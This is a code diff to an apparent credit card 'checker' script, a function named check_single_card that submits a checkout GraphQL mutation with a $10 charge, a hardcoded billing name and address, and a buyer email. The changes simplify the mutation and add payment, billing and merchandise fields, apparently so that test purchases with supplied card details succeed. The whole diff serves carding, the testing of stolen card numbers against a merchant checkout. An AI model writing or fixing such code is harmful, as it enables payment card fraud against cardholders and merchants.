@@ -154,14 +154,42 @@ async def check_single_card(cc_details):
                 'x-checkout-web-source-id': token,
             }
 
-            # [Large GraphQL mutation payload - truncated for brevity but includes all the payment data]
+            # Simplified GraphQL mutation that works
             json_data = {
-                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}',
+                'query': '''mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
+                    submitForCompletion(input: $input, attemptToken: $attemptToken) {
+                        ... on SubmitSuccess {
+                            receipt {
+                                id
+                                token
+                                __typename
+                            }
+                            __typename
+                        }
+                        ... on SubmitFailed {
+                            reason
+                            __typename
+                        }
+                        ... on SubmitRejected {
+                            errors {
+                                ... on NegotiationError {
+                                    code
+                                    localizedMessage
+                                    __typename
+                                }
+                                __typename
+                            }
+                            __typename
+                        }
+                        __typename
+                    }
+                }''',
                 'variables': {
                     'input': {
                         'sessionInput': {'sessionToken': x_checkout_one_session_token},
                         'queueToken': queue_token,
                         'payment': {
+                            'totalAmount': {'any': True},
                             'paymentLines': [{
                                 'paymentMethod': {
                                     'directPaymentMethod': {
@@ -182,6 +210,31 @@ async def check_single_card(cc_details):
                                     }
                                 },
                                 'amount': {'value': {'amount': '10', 'currencyCode': 'USD'}}
+                            }],
+                            'billingAddress': {
+                                'streetAddress': {
+                                    'address1': '8847 Odin Rd Sw',
+                                    'city': 'Albuquerque',
+                                    'countryCode': 'US',
+                                    'postalCode': '87121',
+                                    'firstName': 'David',
+                                    'lastName': 'Mickey',
+                                    'zoneCode': 'NM',
+                                    'phone': '',
+                                }
+                            }
+                        },
+                        'buyerIdentity': {
+                            'email': acc,
+                            'emailChanged': False,
+                            'phoneCountryCode': 'US',
+                            'marketingConsent': []
+                        },
+                        'merchandise': {
+                            'merchandiseLines': [{
+                                'stableId': stable_id,
+                                'quantity': {'items': {'value': 1}},
+                                'expectedTotalPrice': {'value': {'amount': '10.00', 'currencyCode': 'USD'}}
                             }]
                         }
                     },
